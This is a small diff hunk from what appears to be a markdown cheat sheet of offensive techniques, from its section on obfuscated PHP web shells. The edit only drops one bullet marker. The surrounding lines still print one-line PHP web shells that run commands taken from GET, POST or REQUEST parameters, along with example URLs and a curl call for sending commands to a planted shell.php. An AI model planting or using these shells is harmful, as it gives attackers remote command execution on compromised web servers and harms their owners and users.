@@ -128,7 +128,7 @@ ____
 
 ### PHP Reverse Shell > <a name="obfuscate_php_web_shell"></a>Obfuscate PHP Web Shell
 ###### <?=`$_GET[0]`?>
-* ###### Example: http://site.com/path/to/shell.php?0=command 
+Example: http://site.com/path/to/shell.php?0=command 
 ###### <?=`$_POST[0]`?>
 * ###### Example: curl -X POST http://site.com/path/to/shell.php -d "0=command" 
 ###### <?=`{$_REQUEST['_']}`?>
